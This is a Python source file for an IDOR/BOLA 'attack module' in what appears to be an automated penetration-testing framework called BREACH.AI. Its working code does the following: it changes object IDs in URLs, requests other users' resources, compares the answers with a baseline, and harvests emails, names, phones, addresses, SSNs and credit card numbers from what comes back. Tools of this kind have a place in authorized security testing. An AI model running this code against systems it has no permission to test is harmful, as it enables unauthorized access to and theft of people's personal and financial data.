"""
BREACH.AI - IDOR/BOLA Attack Module

Tests for Insecure Direct Object Reference vulnerabilities
(also known as Broken Object Level Authorization - BOLA).
"""

import re
from typing import Optional

from breach.attacks.base import AttackResult, BaseAttack
from breach.core.memory import AccessLevel, Severity
from breach.utils.http import HTTPClient, HTTPResponse
from breach.utils.logger import logger


class IDORAttack(BaseAttack):
    """
    IDOR (Insecure Direct Object Reference) attack module.

    Tests whether access controls properly verify that a user
    has permission to access requested resources.
    """

    name = "Insecure Direct Object Reference"
    attack_type = "idor"
    description = "Tests for IDOR/BOLA vulnerabilities"
    severity = Severity.HIGH
    owasp_category = "A01:2021 Broken Access Control"
    cwe_id = 639

    # ID mutation strategies
    ID_MUTATIONS = [
        lambda x: str(int(x) - 1) if x.isdigit() else None,  # Decrement
        lambda x: str(int(x) + 1) if x.isdigit() else None,  # Increment
        lambda x: "1" if x.isdigit() else None,  # First user/resource
        lambda x: "0",  # Zero
        lambda x: "-1",  # Negative
        lambda x: str(int(x) * 2) if x.isdigit() else None,  # Double
    ]

    # Common ID parameter names
    ID_PARAMS = [
        "id", "user_id", "userId", "uid", "account_id", "accountId",
        "order_id", "orderId", "doc_id", "docId", "file_id", "fileId",
        "item_id", "itemId", "product_id", "productId", "record_id",
        "ref", "reference", "num", "number", "key",
    ]

    def get_payloads(self) -> list[str]:
        return ["1", "2", "0", "-1", "999999"]

    async def check(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> bool:
        """Check if IDOR might be present."""
        # Check if URL or parameters contain ID-like values
        has_numeric_id = bool(re.search(r'/\d+', url) or re.search(r'[?&]\w*id=\d+', url))
        has_id_param = parameter and any(p in parameter.lower() for p in self.ID_PARAMS)

        return has_numeric_id or has_id_param

    async def exploit(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> AttackResult:
        """Test for IDOR vulnerability."""
        result = self._create_result(False, url, parameter)

        # Get baseline response with original ID
        baseline = await self.http_client.request(method, url)

        if not baseline.is_success:
            return result

        # Extract current ID from URL or parameter
        current_id = self._extract_id(url, parameter)
        if not current_id:
            return result

        result.context["original_id"] = current_id

        # Try different IDs
        for mutation in self.ID_MUTATIONS:
            try:
                new_id = mutation(current_id)
                if not new_id or new_id == current_id:
                    continue

                # Construct new URL/request with mutated ID
                test_url = self._replace_id(url, current_id, new_id)

                response = await self.http_client.request(method, test_url)

                # Check if we got different valid data
                if self._is_idor_successful(response, baseline, current_id, new_id):
                    result.success = True
                    result.payload = f"Changed ID from {current_id} to {new_id}"
                    result.details = f"IDOR: Accessed resource with ID {new_id}"
                    result.response = response.body[:2000]
                    result.access_gained = AccessLevel.USER

                    # Extract what data was exposed
                    result.data_sample = self._extract_sensitive_data(response.body)

                    result.add_evidence(
                        "idor_access",
                        f"Accessed unauthorized resource ID: {new_id}",
                        {
                            "original_id": current_id,
                            "accessed_id": new_id,
                            "url": test_url,
                        }
                    )

                    return result

            except Exception as e:
                logger.debug(f"IDOR mutation failed: {e}")
                continue

        # Try horizontal privilege escalation (accessing other users' data)
        horizontal_result = await self._test_horizontal_escalation(url, parameter, method, baseline)
        if horizontal_result:
            result.success = True
            result.payload = horizontal_result["payload"]
            result.details = horizontal_result["details"]
            result.data_sample = horizontal_result.get("data")
            result.add_evidence("horizontal_idor", "Horizontal privilege escalation", horizontal_result)

        return result

    def _extract_id(self, url: str, parameter: Optional[str]) -> Optional[str]:
        """Extract ID value from URL or parameter."""
        # Check URL path for numeric ID
        path_match = re.search(r'/(\d+)(?:/|$|\?)', url)
        if path_match:
            return path_match.group(1)

        # Check query parameters
        param_match = re.search(r'[?&](?:' + '|'.join(self.ID_PARAMS) + r')=(\d+)', url, re.IGNORECASE)
        if param_match:
            return param_match.group(1)

        # Check for UUID
        uuid_match = re.search(r'[?&/]([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', url, re.IGNORECASE)
        if uuid_match:
            return uuid_match.group(1)

        return None

    def _replace_id(self, url: str, old_id: str, new_id: str) -> str:
        """Replace ID in URL."""
        # Try path replacement first
        new_url = re.sub(rf'/({old_id})(?=/|$|\?)', f'/{new_id}', url)

        # If that didn't work, try parameter replacement
        if new_url == url:
            new_url = re.sub(rf'(=)({old_id})(?=&|$)', rf'\g<1>{new_id}', url)

        return new_url

    def _is_idor_successful(
        self,
        response: HTTPResponse,
        baseline: HTTPResponse,
        original_id: str,
        new_id: str
    ) -> bool:
        """Check if IDOR was successful."""
        # Must get successful response
        if not response.is_success:
            return False

        # Response should have different content (different resource)
        if response.body == baseline.body:
            return False

        # New ID should appear in response (we're seeing different data)
        if new_id in response.body and original_id not in response.body:
            return True

        # Check for different user/resource indicators
        body_lower = response.body.lower()
        baseline_lower = baseline.body.lower()

        # Different email
        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        response_emails = set(re.findall(email_pattern, body_lower))
        baseline_emails = set(re.findall(email_pattern, baseline_lower))
        if response_emails and response_emails != baseline_emails:
            return True

        # Different names/usernames
        if "name" in body_lower or "user" in body_lower:
            # Significant content difference
            if abs(len(response.body) - len(baseline.body)) > 50:
                return True

        return False

    def _extract_sensitive_data(self, body: str) -> str:
        """Extract potentially sensitive data from response."""
        sensitive_patterns = [
            (r'"email"\s*:\s*"([^"]+)"', "email"),
            (r'"name"\s*:\s*"([^"]+)"', "name"),
            (r'"phone"\s*:\s*"([^"]+)"', "phone"),
            (r'"address"\s*:\s*"([^"]+)"', "address"),
            (r'"ssn"\s*:\s*"([^"]+)"', "ssn"),
            (r'"credit_card"\s*:\s*"([^"]+)"', "credit_card"),
        ]

        found_data = []
        for pattern, data_type in sensitive_patterns:
            matches = re.findall(pattern, body, re.IGNORECASE)
            if matches:
                found_data.append(f"{data_type}: {matches[0]}")

        return "; ".join(found_data) if found_data else body[:200]

    async def _test_horizontal_escalation(
        self,
        url: str,
        parameter: Optional[str],
        method: str,
        baseline: HTTPResponse
    ) -> Optional[dict]:
        """Test horizontal privilege escalation."""
        # Try common ID sequences
        test_ids = ["1", "2", "3", "100", "1000", "admin", "test"]

        for test_id in test_ids:
            # Skip if this is our current ID
            current_id = self._extract_id(url, parameter)
            if test_id == current_id:
                continue

            test_url = url
            if current_id:
                test_url = self._replace_id(url, current_id, test_id)
            elif parameter:
                separator = "&" if "?" in url else "?"
                test_url = f"{url}{separator}{parameter}={test_id}"

            response = await self.http_client.request(method, test_url)

            if response.is_success and response.body != baseline.body:
                return {
                    "payload": f"ID: {test_id}",
                    "details": f"Accessed different user's data with ID {test_id}",
                    "data": self._extract_sensitive_data(response.body),
                }

        return None
